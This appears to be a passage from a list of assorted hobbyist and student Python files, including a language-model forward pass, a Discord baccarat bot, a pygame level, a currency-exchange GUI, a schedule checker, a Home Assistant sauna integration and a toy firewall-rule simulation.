self.vocab_dim == self.latent_dim else nn.Linear(self.latent_dim, self.vocab_dim, bias=args.bias)\n        self.pad_x = getattr(args, 'pad_x', False)\n        self.embedding_scale = (None if not getattr(args,'embedding_scale',False) else math.sqrt(vocab_dim))\n        self.embedding = nn.Embedding(num_embeddings=args.vocab_size, embedding_dim=self.vocab_dim)\n\n        make_layer = MetaLayer if not hasattr(args, 'MetaLayer') else args.MetaLayer\n        self.layers = nn.ModuleList([make_layer(**dict(layer,**kwargs)) for layer in args.layers])\n        self.lm_head = None if not getattr(args, 'lm_head', False) else nn.Linear(self.vocab_dim, args.vocab_size,bias=False)\n\n        prev_norm = getattr(args, 'prev_norm', None)\n        if prev_norm is not None:\n            match prev_norm:\n                case 'gemma':\n                    from Gemma import GemmaEmbNorm\n                    prev_norm = GemmaEmbNorm()\n                case _:\n                    prev_norm = nn.RMSNorm(args.latent_dim)\n        self.prev_norm = prev_norm\n        self.post_norm = nn.RMSNorm(self.vocab_dim)\n        self.cache = {}\n        return self\n\n    def forward(self, inputs, targets=None, state=None):\n        # -- Embedding and layers\n        x = self.embedding(inputs)\n\n        # -- vocab_dim --> latent_dim\n        if self.vocab_dim != self.latent_dim:\n            if self.pad_x:\n                x = np.pad(x, (self.latent_dim-self.vocab_dim,0), mode='constant', value=float(0.0))\n            else:\n                x = self.in_proj(x)\n\n        if self.embedding_scale is not None:    # RetNet, nonsense :(. \n            x = x * self.embedding_scale\n\n        # -- layers --\n        if self.prev_norm is not None:\n            x = self.prev_norm(x)\n        if(state is not None):\n            layer_states = state.get('layer_states', None)\n            if layer_states is None:\n                layer_states = [{} for _ in self.layers]\n                state['layer_states'] = layer_states\n\n        layer_losses = []\n        for i in range(len(self.layers)):\n            l_state = None if state is None else layer_states[i]\n            x, loss = self.layers[i](x, cache=self.cache, state=l_state)\n            if loss is not None:\n                layer_losses.append(loss)\n\n        # -- latent_dim --> vocab_dim\n        if self.vocab_dim != self.latent_dim:\n            if self.pad_x:\n                x = np.pad(x, (self.vocab_dim-self.latent_dim,0), mode='constant', value=float(0.0))\n            else:\n                x = self.out_proj(x)\n\n        if self.post_norm is not None:\n            x = self.post_norm(x)\n\n        # -- vocab_dim --> logits\n        if self.lm_head is not None:\n            y = self.lm_head(x)    # -- LLaMA vs embedding.weight ? --\n        else:\n            y = np.einsum('bld,nd->bln', x, self.embedding.weight) * (self.vocab_dim**-0.5)\n\n        # -- logits --> output\n        if(targets is not None):\n            if self.train_mode is None:\n                loss = np.cross_entropy(y.view(-1, y.size(-1)), targets.reshape(-1), ignore_index=-1)\n                if len(layer_losses) > 0:\n                    loss += np.sum(np.stack(layer_losses, dim=-1)) / len(layer_losses)\n            else:\n                assert False\n            return y, loss\n   ",
    "import discord\nimport random\nfrom discord.ext import commands\n\nintents = discord.Intents.all()\nbot = commands.Bot(command_prefix=\"!\", intents=intents)\nTOKEN = \"\"\n@bot.event\nasync def on_ready():\n    print(f'We have logged in as {bot.user}')\n\nuser_balances = {}  # \uc0ac\uc6a9\uc790\uc758 \uc794\uc561\uc744 \uc800\uc7a5\ud560 \ub515\uc154\ub108\ub9ac\n\n@bot.event\nasync def on_ready():\n    print(f'We have logged in as {bot.user}')\n\nclass BaccaratGame:\n    def __init__(self, bet_amount):\n        self.bet_amount = bet_amount\n        self.player_cards = []\n        self.banker_cards = []\n\n    def deal_cards(self):\n        deck = ['A', '2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K'] * 4\n        deck = list(deck)\n        random.shuffle(deck)\n        self.player_cards = [deck.pop(), deck.pop()]\n        self.banker_cards = [deck.pop(), deck.pop()]\n\n    def calculate_total(self, cards):\n        total = 0\n        for card in cards:\n            if card.isdigit():\n                total += int(card)\n            elif card in ['J', 'Q', 'K']:\n                total += 10\n            else:\n                total += 1\n        return total\n\n    def calculate_result(self, choice):\n        player_total = self.calculate_total(self.player_cards)\n        banker_total = self.calculate_total(self.banker_cards)\n        if player_total > banker_total:\n            if choice == '\ud50c\ub808\uc774\uc5b4':\n                return \"Player wins!\"\n            else:\n                return \"Banker wins!\"\n        elif player_total < banker_total:\n            if choice == '\ubc45\ucee4':\n                return \"Banker wins!\"\n            else:\n                return \"Player wins!\"\n        else:\n            return \"Tie!\"\n\n@bot.slash_command(name='\ubc14\uce74\ub77c')\nasync def baccarat(ctx, bet_amount: int, choice: str):\n    if bet_amount <= 0:\n        await ctx.respond(\"\ubca0\ud305 \uae08\uc561\uc740 0\ubcf4\ub2e4 \ucee4\uc57c \ud569\ub2c8\ub2e4.\")\n        return\n\n    if choice not in ['\ud50c\ub808\uc774\uc5b4', '\ubc45\ucee4', '\ubb34\uc2b9\ubd80']:\n        await ctx.respond(\"\uc62c\ubc14\ub978 \uc120\ud0dd\uc744 \ud574\uc8fc\uc138\uc694: '\ud50c\ub808\uc774\uc5b4', '\ubc45\ucee4', '\ubb34\uc2b9\ubd80'\")\n        return\n\n    if ctx.author.id not in user_balances:\n        user_balances[ctx.author.id] = 0\n\n    if user_balances[ctx.author.id] < bet_amount:\n        await ctx.respond(\"\uc794\uc561\uc774 \ubd80\uc871\ud569\ub2c8\ub2e4.\")\n        return\n\n    game = BaccaratGame(bet_amount)\n    game.deal_cards()\n    result = game.calculate_result(choice)\n\n    winnings = 0\n    if result == choice:\n        winnings = bet_amount * 2\n        user_balances[ctx.author.id] += winnings\n    else:\n        user_balances[ctx.author.id] -= bet_amount\n\n    await ctx.respond(f\"\ud50c\ub808\uc774\uc5b4 \uce74\ub4dc: {game.player_cards}\\n\ubc45\ucee4 \uce74\ub4dc: {game.banker_cards}\\n{result}\uc774 \ub098\uc654\uc2b5\ub2c8\ub2e4. {'\ub2f9\ucca8\uc785\ub2c8\ub2e4! \ubc30\ud305\uae08\uc561\uc758 2\ubc30\uc778 '+str(winnings)+'\ub97c \ud68d\ub4dd\ud558\uc168\uc2b5\ub2c8\ub2e4!' if winnings > 0 else '\uc544\uc27d\uc9c0\ub9cc \ubca0\ud305\uae08\uc561\uc744 \uc783\uc5c8\uc2b5\ub2c8\ub2e4.'}\")\n\n@bot.slash_command(name='\uc794\uc561')\nasync def balance(ctx):\n    if ctx.author.id not in user_balances:\n        await ctx.respond(\"\uc794\uc561: 0\")\n    else:\n        await ctx.respond(f\"\uc794\uc561: {user_balances[ctx.author.id]}\")\n\n@bot.slash_command(name='\uc785\uae08')\nasync def deposit(ctx, amount: int):\n    if amount <= 0:\n        await ctx.respond(\"\uc785\uae08 \uae08\uc561\uc740 0\ubcf4\ub2e4 \ucee4\uc57c \ud569\ub2c8\ub2e4.\")\n        return\n\n    if ctx.author.id not in user_balances:\n        user_balances[ctx.author.id] = 0\n\n    user_balances[ctx.author.id] += amount\n    await ctx.respond(f\"{amount} \ub9cc\ud07c\uc758 \uae08\uc561\uc744 \uc785\uae08\ud558\uc600\uc2b5\ub2c8\ub2e4.\")\nbot.run(TOKEN)\n",
    "import pygame\r\nfrom tiles import Tile\r\nfrom settings import tile_size, screen_width\r\nfrom player import Player\r\n\r\nclass Level:\r\n    def __init__(self, level_data, surface):\r\n        \r\n        # level setup\r\n        self.display_surface = surface\r\n        self.setup_level(level_data) # hace de una funci\u00f3n propia una variable propia\r\n        self.world_shift = 0\r\n        self.current_x = 0\r\n\r\n    def setup_level(self, layout):\r\n        self.tiles = pygame.sprite.Group()\r\n        self.player = pygame.sprite.GroupSingle() # crea un grupo de sprites de un s\u00f3lo elemento\r\n        for row_index, row in enumerate(layout): # enumerate nos da el \u00edndice y el contenido \r\n            for col_index, cell in enumerate(row):\r\n                x = col_index * tile_size\r\n                y = row_index * tile_size\r\n\r\n                if cell == \"X\":\r\n                    tile = Tile((x, y), tile_size)\r\n                    self.tiles.add(tile)\r\n                elif cell == \"P\":\r\n                    player_sprite = Player((x, y), self.display_surface)\r\n                    self.player.add(player_sprite)\r\n\r\n    def scroll_x(self):\r\n        player = self.player.sprite # almacenamos el sprite dentro de self.player\r\n        player_x = player.rect.centerx # almacenamos el centro en x de player\r\n        direction_x = player.direction.x\r\n\r\n        if player_x < screen_width / 4 and direction_x < 0:\r\n            self.world_shift = 8\r\n            player.speed = 0\r\n        elif player_x > screen_width - (screen_width / 4) and direction_x > 0:\r\n            self.world_shift = -8\r\n            player.speed = 0\r\n        else:\r\n            self.world_shift = 0\r\n            player.speed = 8\r\n\r\n    def horizontal_movement_collision(self):\r\n        player = self.player.sprite\r\n        player.rect.x += player.direction.x * player.speed\r\n\r\n        for sprite in self.tiles.sprites():\r\n            if sprite.rect.colliderect(player.rect):\r\n                if player.direction.x < 0:\r\n                    player.rect.left = sprite.rect.right\r\n                    player.on_left = True\r\n                    self.current_x = player.rect.left\r\n                elif player.direction.x > 0:\r\n                    player.rect.right = sprite.rect.left\r\n                    player.on_right = True\r\n                    self.current_x = player.rect.right\r\n        \r\n        if player.on_left and (player.rect.left < self.current_x or player.direction.x >= 0):\r\n            player.on_left = False\r\n        if player.on_right and (player.rect.right > self.current_x or player.direction.x <= 0):\r\n            player.on_right = False\r\n    \r\n    def vertical_movement_collision(self):\r\n        player = self.player.sprite\r\n        player.apply_gravity()\r\n\r\n        for sprite in self.tiles.sprites():\r\n            if sprite.rect.colliderect(player.rect):\r\n                if player.direction.y > 0:\r\n                    player.rect.bottom = sprite.rect.top\r\n                    player.direction.y = 0\r\n                    player.on_ground = True\r\n                elif player.direction.y < 0:\r\n                    player.rect.top = sprite.rect.bottom\r\n                    player.direction.y = 0\r\n                    player.on_ceiling = True\r\n        \r\n        if player.on_ground and player.direction.y < 0 or player.direction.y > 1:\r\n            player.on_ground = False\r\n        if player.on_ceiling and player.direction.y > 0.1:\r\n            player.on_ceiling = False\r\n\r\n    def run(self):\r\n        \r\n        # level_tiles\r\n        self.tiles.update(self.world_shift)\r\n        self.tiles.draw(self.display_surface)\r\n        self.scroll_x()\r\n        \r\n        # player\r\n        self.player.update()\r\n        self.horizontal_movement_collision()\r\n        self.vertical_movement_collision()\r\n        self.player.draw(self.display_surface)",
    "class GetoptError(Exception):\n    pass\n\n\ndef w_getopt(args, options):\n    \"\"\"A getopt for Windows.\n\n    Options may start with either '-' or '/', the option names may\n    have more than one letter (/tlb or -RegServer), and option names\n    are case insensitive.\n\n    Returns two elements, just as getopt.getopt.  The first is a list\n    of (option, value) pairs in the same way getopt.getopt does, but\n    there is no '-' or '/' prefix to the option name, and the option\n    name is always lower case.  The second is the list of arguments\n    which do not belong to an option.\n\n    Different from getopt.getopt, a single argument not belonging to an option\n    does not terminate parsing.\n    \"\"\"\n    opts = []\n    arguments = []\n    while args:\n        if args[0][:1] in \"/-\":\n            arg = args[0][1:]  # strip the '-' or '/'\n            arg = arg.lower()\n\n            if arg + \":\" in options:\n                try:\n                    opts.append((arg, args[1]))\n                except IndexError:\n                    raise GetoptError(\"option '%s' requires an argument\" % args[0])\n                args = args[1:]\n            elif arg in options:\n                opts.append((arg, \"\"))\n            else:\n                raise GetoptError(\"invalid option '%s'\" % args[0])\n            args = args[1:]\n        else:\n            arguments.append(args[0])\n            args = args[1:]\n\n    return opts, arguments\n\n\nif __debug__:\n    if __name__ == \"__main__\":\n        import unittest\n\n        class TestCase(unittest.TestCase):\n            def test_1(self):\n                args = \"-embedding spam /RegServer foo /UnregSERVER blabla\".split()\n                opts, args = w_getopt(args, \"regserver unregserver embedding\".split())\n                self.assertEqual(\n                    opts, [(\"embedding\", \"\"), (\"regserver\", \"\"), (\"unregserver\", \"\")]\n                )\n                self.assertEqual(args, [\"spam\", \"foo\", \"blabla\"])\n\n            def test_2(self):\n                args = \"/TLB Hello.Tlb HELLO.idl\".split()\n                opts, args = w_getopt(args, [\"tlb:\"])\n                self.assertEqual(opts, [(\"tlb\", \"Hello.Tlb\")])\n                self.assertEqual(args, [\"HELLO.idl\"])\n\n            def test_3(self):\n                # Invalid option\n                self.assertRaises(\n                    GetoptError, w_getopt, \"/TLIB hello.tlb hello.idl\".split(), [\"tlb:\"]\n                )\n\n            def test_4(self):\n                # Missing argument\n                self.assertRaises(GetoptError, w_getopt, \"/TLB\".split(), [\"tlb:\"])\n\n        unittest.main()\n",
    "\"\"\"\nCEApp - Cash Exchange Application - GUI\n\n2024\n\n\"\"\"\n\nfrom tkinter import *\nimport customtkinter\nfrom CTkMessagebox import CTkMessagebox\nfrom customtkinter import *\nfrom PIL import Image\nfrom ceapp_engine import *\nimport time\nimport webbrowser\n\n\nclass SetApp(customtkinter.CTk):\n\n    customtkinter.set_appearance_mode(\"light\")\n    customtkinter.set_default_color_theme(\"blue\")\n\n    def __init__(self, title, app_x, app_y):\n        super().__init__()\n\n        # Basic window setup\n        self.title(title)\n\n        screen_x = self.winfo_screenwidth()\n        screen_y = self.winfo_screenheight()\n        x_position = (screen_x / 2) - (int(app_x) / 2)\n        y_position = (screen_y / 2) - (int(app_y) / 2)\n        self.geometry(f'{app_x}x{app_y}+{x_position}+{y_position}')\n        self.resizable(False, False)\n        self.grid_rowconfigure(0, weight=1)\n        self.grid_columnconfigure(1, weight=1)\n\n        # Image Loading System - Navigation Frame\n        nav_logo = customtkinter.CTkImage(Image.open(\n            'images/CEApp_logo.png'), size=(100, 100))\n        home_button_logo = customtkinter.CTkImage(\n            Image.open('images/home.png'), size=(90, 90))\n        exchange_button_logo = customtkinter.CTkImage(\n            Image.open('images/search.png'), size=(80, 80))\n        converter_button_logo = customtkinter.CTkImage(\n            Image.open('images/exchange.png'), size=(80, 80))\n        author_button_logo = customtkinter.CTkImage(\n            Image.open('images/author.png'), size=(80, 80))\n        exit_button_logo = customtkinter.CTkImage(\n            Image.open('images/exit.png'), size=(80, 80))\n        home_ceapp = customtkinter.CTkImage(Image.open(\n            'images/CEApp_logo_full.png'), size=(500, 100))\n        usa_flag = customtkinter.CTkImage(Image.open(\n            'images/usd.png'), size=(50, 35))\n        eur_flag = customtkinter.CTkImage(Image.open(\n            'images/eur.png'), size=(50, 35))\n        chf_flag = customtkinter.CTkImage(Image.open(\n            'images/chf.png'), size=(50, 35))\n        gbp_flag = customtkinter.CTkImage(Image.open(\n            'images/gbp.png'), size=(50, 35))\n        uah_flag = customtkinter.CTkImage(Image.open(\n            'images/uah.png'), size=(50, 35))\n        czk_flag = customtkinter.CTkImage(Image.open(\n            'images/czk.png'), size=(50, 35))\n        dkk_flag = customtkinter.CTkImage(Image.open(\n            'images/dkk.png'), size=(50, 35))\n        sek_flag = customtkinter.CTkImage(Image.open(\n            'images/sek.png'), size=(50, 35))\n        bgn_flag = customtkinter.CTkImage(Image.open(\n            'images/bgn.png'), size=(50, 35))\n        ron_flag = customtkinter.CTkImage(Image.open(\n            'images/ron.png'), size=(50, 35))\n        ils_flag = customtkinter.CTkImage(Image.open(\n            'images/ils.png'), size=(50, 35))\n        brl_flag = customtkinter.CTkImage(Image.open(\n            'images/brl.png'), size=(50, 35))\n        nor_flag = customtkinter.CTkImage(Image.open(\n            'images/nor.png'), size=(50, 35))\n        mex_flag = customtkinter.CTkImage(Image.open(\n            'images/mex.png'), size=(50, 35))\n        sgd_flag = customtkinter.CTkImage(Image.open(\n            'images/sgd.png'), size=(50, 35))\n        cny_flag = customtkinter.CTkImage(Image.open(\n            'images/cny.png'), size=(50, 35))\n        hkd_flag = customtkinter.CTkImage(Image.open(\n            'images/hkd.png'), size=(50, 35))\n        aud_flag = customtkinter.CTkImage(Image.open(\n            'images/aud.png'), size=(50, 35))\n        thb_flag = customtkinter.CTkImage(Image.open(\n            'images/thb.png'), size=(50, 35))\n        mod_a = customtkinter.CTkImage(Image.open(\n            'images/A.png'), size=(150, 100))\n        converter_title = customtkinter.CTkImage(Image.open(\n            'images/converter_title.png'), size=(300, 100))\n        history_search_title = customtkinter.CTkImage(Image.open(\n            'images/historic_title.png'), size=(300, 100))\n        gold_converter_title = customtkinter.CTkImage(Image.open(\n            'images/gold_title.png'), size=(300, 100))\n        author_converter_title = customtkinter.CTkImage(Image.open(\n            'images/author_logo.png'), size=(500, 100))\n        clock_main_title = customtkinter.CTkImage(Image.open(\n            'images/clock.png'), size=(100, 100))\n        nbp_main_title = customtkinter.CTkImage(Image.open(\n            'images/nbp.png'), size=(100, 100))\n\n        # Navigation Menu Frame\n        self.navigation_menu = customtkinter.CTkFrame(self)\n        self.navigation_menu.grid(row=0, column=0, sticky=\"nsew\")\n        navigation_logo_menu = CTkLabel(\n            self.navigation_menu,\n            text=' Menu',\n            text_color=(\n                '#000000'),\n            font=(\n                'Unispace',\n                30,\n                'bold'),\n            compound='left',\n            image=nav_logo,\n            pady=30)\n        navigation_logo_menu.grid(row=0, column=0)\n\n        self.",
    "#Check if any two lists overlap by checking if any value falls between another list or if one of the values are equal\ndef isOverlapping(lst1, lst2):\n    if (lst2[0] > lst1[0] and lst2[0] < lst1[-1]) or (lst1[0] > lst2[0] and lst1[0] < lst2[-1]):\n\n        return True\n\n    elif (lst1[0] == lst2[0] or lst1[-1] == lst2[-1]):\n\n        return True\n\n    return False\n\n#Convert time to flaot, i.e., \"12:30-14:00\" --> [12.5,14.0]. This will be used with the overlapping function\ndef TimeToFloat(time):\n    #Convert the string into a list\n    time = time.split(\"-\")\n\n    #Loop through the list and divide the last 2 numbers by 60. Ex: if the time ends in 30, like 12:30, you'll get 12.5\n    for index in range(len(time)):\n        time[index] = float(time[index][:-3]) + float(time[index][-2:]) / 60\n\n    return time\n\n#Check if two courses can be registered together. This utilizes the overlapping and time to float conversion functions\ndef isEligible(firstCourse, secondCourse):\n    #Loop through the timings of each course\n    for firstCourseTiming in range(2, len(firstCourse), 2):\n        for secondCourseTiming in range(2, len(secondCourse), 2):\n            #Get the course time and the course day\n            courseOneTime = TimeToFloat(firstCourse[firstCourseTiming])\n            courseTwoTime = TimeToFloat(secondCourse[secondCourseTiming])\n\n            courseOneDay = firstCourse[firstCourseTiming - 1]\n            courseTwoDay = secondCourse[secondCourseTiming - 1]\n            #If the course days are the same and their timings overlap, return false\n            if courseOneDay == courseTwoDay and isOverlapping(courseOneTime, courseTwoTime):\n                return False\n    return True\n\n#Check if a schedule is eligible by checking if every course in said schedule doesn't overlap with another course\ndef isEligibleSchedule(schedule):\n    for firstCourse in range(len(schedule)):\n        for consequentCourse in schedule[firstCourse+1:]:\n            if isEligible(schedule[firstCourse],consequentCourse) == False:\n                return False\n    return True\n\n#Display the course in a formal way.\n#Ex: ['course1,'monday','12:00-15:00','wednesday','9:00-12:00'] --> course1: monday 12:00-15:00, wednesday 9:00-12:00\ndef displayCourse(course):\n    #loop through the course information\n    for info in range(len(course)):\n        #if it's the first item (course name), add :\n        if info == 0:\n            print(course[info] + \": \", end='')\n        #If not, check if it's the course day (odd numbers) and display it with the timing (the item next).\n        elif info % 2 != 0:\n            print(course[info], course[info + 1], end='')\n        #Don't add a comma to the last item\n            if info != len(course) - 2:\n                print(\",\", end='')\n\n#Display the schedule in a formal way.\n#Loop through the courses and use the displayCourse function\ndef displaySchedule(schedule):\n\n    print(\"Missing days: \" + getMissingDays(schedule))\n    print(\"Total hours of freetime: \" + str(totalFreeTimePerSchedule(schedule)) + \" hours\")\n    print(\"Average starting time: \" + singleFloatToTime(averageStartTimePerSchedule(schedule)))\n    print(\"Average finishing time: \" + singleFloatToTime(averageFinishTimePerSchedule(schedule)))\n    print()\n\n    for course in schedule:\n        displayCourse(course)\n        print()\n\n#Get any missing days in a specific schedule. This is a filter function to determine if any schedule can lack any day\ndef getMissingDays(schedule):\n    allowedDays = {'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday'}\n    scheduledDays = set()\n\n    for course in schedule:\n        for day in range(1, len(course), 2):\n            scheduledDays.add(course[day])\n\n    missingDays = list(allowedDays - scheduledDays)\n\n    if len(missingDays) == 0:\n        return 'No missing days'\n\n    elif len(missingDays) == 1:\n        return missingDays[0]\n\n    else:\n        missingDaysDisplay = ','.join(missingDays[:-1]) + ' and ' + missingDays[-1]\n\n    return missingDaysDisplay\n\n\n#Get the course name from the file. Ex: Get the \"Information Structures\" from \"Information Structures(BCS206Lec3)\"\ndef courseName(string):\n    return string[:string.find(\"(\")]\n\n#Convert the course, as a string, to a list.\ndef courseStringToCourseList(course):\n    course = course.split(',')\n\n    return course\n\n#Get the class timings for each day\ndef timePerEachDay(schedule):\n    timePerDay = {}\n\n    for course in schedule:\n        for day in range(1, len(course), 2):\n\n            if course[day] not in timePerDay:\n                timePerDay[course[day]] = []\n\n    for course2 in schedule:\n        for day2 in range(1, len(course2), 2):\n            timePerDay[course2[day2]].append(TimeToFloat(course2[day2 + 1]))\n\n    return timePerDay\n\n#Get the difference between two timings, that is, the time between two classes\ndef timeDifference(timeList):\n    timeList.sort()\n\n    difference = 0\n\n    for time in range(len(timeList) - 1):\n        difference += timeList[time + 1][0] - timeList[time][1]\n\n    retu",
    "import os\r\nimport random\r\n\r\nfrom PIL import Image\r\nfrom torch.utils.data import Dataset\r\n\r\n\r\nclass USIDataset(Dataset):\r\n    def __init__(self, txt_path, transform=None):\r\n        fh_txt = open(txt_path, 'r')\r\n        images_labels = []\r\n\r\n        # loop over txt files\r\n        for line in fh_txt:\r\n            line = line.rstrip()  # default deletion is blank characters ('\\n', '\\r', '\\t', ' ')\r\n            words = line.split()  # default split by space, newline (\\n), tab (\\t)\r\n            images_labels.append((words[0], int(words[1])))\r\n\r\n        # the image paths and labels\r\n        self.images_labels = images_labels\r\n        self.transform = transform\r\n\r\n    def __getitem__(self, index):\r\n\r\n        # the image paths and labels\r\n        images_path, label = self.images_labels[index]\r\n\r\n        # define the selected image prefixes\r\n        prefixes = [\"BUS_\", \"DUS_\", \"EUS_\"]\r\n\r\n        # one randomly selected image from each type\r\n        selected_images = []\r\n\r\n        for prefix in prefixes:\r\n            # get the all matching images\r\n            matching_images = [f for f in os.listdir(images_path) if f.startswith(prefix) and f.endswith(\".jpg\")]\r\n\r\n            # if the matching images exist, choose one at random\r\n            if matching_images:\r\n                selected_image = random.choice(matching_images)\r\n                selected_images.append(selected_image)\r\n\r\n        # get the images of different modalities\r\n        all_images = []\r\n\r\n        # get the image\r\n        for img_name in selected_images:\r\n            img_path = os.path.join(images_path, img_name)\r\n            img_s = Image.open(img_path).convert('RGB')\r\n\r\n            # data augmentation\r\n            if self.transform is not None:\r\n                img_s = self.transform(img_s)\r\n\r\n            # get the images of different modalities\r\n            all_images.append(img_s)\r\n\r\n        return all_images, label\r\n\r\n    def __len__(self):\r\n        return len(self.images_labels)\r\n\r\n\r\nclass USIDatasetFix(Dataset):\r\n    def __init__(self, txt_path, transform=None):\r\n        fh_txt = open(txt_path, 'r')\r\n        images_labels = []\r\n\r\n        # loop over txt files\r\n        for line in fh_txt:\r\n            line = line.rstrip()  # default deletion is blank characters ('\\n', '\\r', '\\t', ' ')\r\n            words = line.split()  # default split by space, newline (\\n), tab (\\t)\r\n            images_labels.append((words[0], int(words[1])))\r\n\r\n        # the image paths and labels\r\n        self.images_labels = images_labels\r\n        self.transform = transform\r\n\r\n    def __getitem__(self, index):\r\n\r\n        # the image paths and labels\r\n        images_path, label = self.images_labels[index]\r\n\r\n        # define the selected image prefixes\r\n        prefixes = [\"BUS_1\", \"DUS_1\", \"EUS_1\"]\r\n\r\n        # one randomly selected image from each type\r\n        selected_images = []\r\n\r\n        for prefix in prefixes:\r\n            # get the all matching images\r\n            matching_images = [f for f in os.listdir(images_path) if f.startswith(prefix) and f.endswith(\".jpg\")]\r\n\r\n            # if the matching images exist, choose one at random\r\n            if matching_images:\r\n                selected_image = random.choice(matching_images)\r\n                selected_images.append(selected_image)\r\n\r\n        # get the images of different modalities\r\n        all_images = []\r\n\r\n        # get the image\r\n        for img_name in selected_images:\r\n            img_path = os.path.join(images_path, img_name)\r\n            img_s = Image.open(img_path).convert('RGB')\r\n\r\n            # data augmentation\r\n            if self.transform is not None:\r\n                img_s = self.transform(img_s)\r\n\r\n            # get the images of different modalities\r\n            all_images.append(img_s)\r\n\r\n        return all_images, label\r\n\r\n    def __len__(self):\r\n        return len(self.images_labels)\r\n\r\n\r\nclass USIDatasetWithPath(Dataset):\r\n    def __init__(self, txt_path, transform=None):\r\n        fh_txt = open(txt_path, 'r')\r\n        images_labels = []\r\n\r\n        # loop over txt files\r\n        for line in fh_txt:\r\n            line = line.rstrip()  # default deletion is blank characters ('\\n', '\\r', '\\t', ' ')\r\n            words = line.split()  # default split by space, newline (\\n), tab (\\t)\r\n            images_labels.append((words[0], int(words[1])))\r\n\r\n        # the image paths and labels\r\n        self.images_labels = images_labels\r\n        self.transform = transform\r\n\r\n    def __getitem__(self, index):\r\n\r\n        # the image paths and labels\r\n        images_path, label = self.images_labels[index]\r\n\r\n        # define the selected image prefixes\r\n        prefixes = [\"BUS_\", \"DUS_\", \"EUS_\"]\r\n\r\n        # one randomly selected image from each type\r\n        selected_images = []\r\n\r\n        for prefix in prefixes:\r\n            # get the all matching images\r\n            matching_images = [f for f in os.listdir(images_path) if f.startswith(prefix) and f.endswith(\".jpg\")]\r\n\r\n            # if the matching images exist, ",
    "import voluptuous as vol\nfrom homeassistant import config_entries\nfrom homeassistant.core import callback\nfrom homeassistant.const import CONF_USERNAME, CONF_PASSWORD\nfrom .api import HarviaSaunaAPI\nfrom .constants import DOMAIN  # Zorg ervoor dat je een const.py hebt met je DOMAIN\n\nclass HarviaSaunaConfigFlow(config_entries.ConfigFlow, domain=DOMAIN):\n    \"\"\"Handle a config flow for your_component.\"\"\"\n\n    VERSION = 1  # De versie van je config flow\n    CONNECTION_CLASS = config_entries.CONN_CLASS_CLOUD_POLL\n\n    async def async_step_user(self, user_input=None):\n        \"\"\"Handle a flow initiated by the user.\"\"\"\n        errors = {}\n\n        # Controleer of we al een configuratie hebben\n        if self._async_current_entries():\n            return self.async_abort(reason=\"single_instance_allowed\")\n\n        # Verwerk ingevulde gegevens\n        if user_input is not None:\n            # Hier zou je de inloggegevens valideren\n            api =  HarviaSaunaAPI(user_input[CONF_USERNAME], user_input[CONF_PASSWORD],self.hass)\n            valid = await api.authenticate()\n            if valid:\n                return self.async_create_entry(title=\"Harvia Sauna\", data=user_input)\n            else:\n                errors[\"base\"] = \"invalid_auth\"\n\n        return self.async_show_form(\n            step_id=\"user\",\n            data_schema=vol.Schema({\n                vol.Required(CONF_USERNAME): str,\n                vol.Required(CONF_PASSWORD): str,\n            }),\n            errors=errors,\n        )\n    def async_get_options_flow(config_entry: config_entries.ConfigEntry) -> config_entries.OptionsFlow:\n        return HarviaSaunaOptionsFlowHandler(config_entry)\n\nclass HarviaSaunaOptionsFlowHandler(config_entries.OptionsFlow):\n    def __init__(self, config_entry: config_entries.ConfigEntry) -> None:\n        \"\"\"Initialize options flow.\"\"\"\n        self.config_entry = config_entry\n\n    async def async_step_init(self, user_input=None):\n        \"\"\"Beheer de opties.\"\"\"\n        errors = {}\n\n        if user_input is not None:\n            # Hier zou je de inloggegevens valideren\n            api =  HarviaSaunaAPI(user_input[CONF_USERNAME], user_input[CONF_PASSWORD],self.hass)\n            valid = await api.authenticate(user_input[CONF_USERNAME], user_input[CONF_PASSWORD])\n            if valid:\n                return self.async_create_entry(title=\"Harvia Sauna\", data=user_input)\n            else:\n                errors[\"base\"] = \"invalid_auth\"\n\n        return self.async_show_form(\n            step_id=\"init\",\n            data_schema=vol.Schema({\n                vol.Required(CONF_USERNAME, default=self.hass.data[DOMAIN][CONF_USERNAME]): str,\n                vol.Required(CONF_PASSWORD, default=self.hass.data[DOMAIN][CONF_PASSWORD]): str,\n            }),\n            errors=errors\n        )",
    "import  random\r\n\r\ndef generate_random_ip():\r\n    \"\"\"Function para makapag generate ng random ip address.\"\"\"\r\n    return f\"192.168.1.{random.randint(0, 20)}\"\r\n\r\ndef check_firewall_rules(ip, rules):\r\n    \"\"\"Function if yung ip is match dun sa firewall rules natin.\"\"\"\r\n    for rule_ip, action in rules.items():\r\n        if ip == rule_ip:\r\n            return action\r\n    return \"allow\"  # Default action if walang mag mamatch\r\n\r\ndef main():\r\n    # Malicious firewall rules (key: IP address, value: action)\r\n    firewall_rules = {\r\n        \"192.168.1.1\": \"block\",\r\n        \"192.168.1.4\": \"block\",\r\n        \"192.168.1.9\": \"block\",\r\n        \"192.168.1.13\": \"block\",\r\n        \"192.168.1.16\": \"block\",\r\n        \"192.168.1.19\": \"block\"\r\n    }\r\n\r\n      # for network test ito!\r\n    for _ in range(20):\r\n     ip_address = generate_random_ip()\r\n     action = check_firewall_rules(ip_address, firewall_rules)\r\n     random_number = random.randint(0, 9999)\r\n     print(f\"IP: {ip_address}, Action: {action}, Random: {random_number}\")\r\n\r\nif __name__ == \"__main__\":\r\n    main()",
    "#This file is for User Interface\r\n# -*- coding: utf-8 -*-\r\n\"\"\"\r\nCreated on Sat Mar 16 10:52:06 2024\r\n\r\n@author: inder\r\n\"\"\"\r\n#UserInterface \r\n\r\nfrom Database import LibraryDatabase\r\nimport sys\r\n\r\nclass CommandLineInterface:\r\n    \r\n    def __init__(self):\r\n        print(\"Welcome to Inderjit's library sytem version 1.0.\")\r\n        self.db = LibraryDatabase(\"library.db\")\r\n        self.mainMenu()\r\n        \r\n    def mainMenu(self):\r\n        print(\"What would you like to do?\")\r\n        print(\"\")\r\n        print(\"1:Checkout/Return Book  2:Manage Books  3:User Information  4:Close Program\")\r\n        try:\r\n            userInput = int(input())\r\n            if 0 < userInput < 5:\r\n                switcher = {\r\n                    1: self.checkingReturning,\r\n                    2: self.manageBooks,\r\n                    3: self.userInformation,\r\n                    4: self.termination\r\n                }\r\n                switcher.get(userInput)() \r\n            else:\r\n                print(\"This is not a vaild option try a number from 1-4.\")\r\n                self.mainMenu()\r\n        except ValueError:\r\n            print(\"This is not a vaild option try a number from 1-4.\")\r\n            self.mainMenu()\r\n         \r\n    #this will allow the user to checkout and return book        \r\n    def checkingReturning(self):\r\n        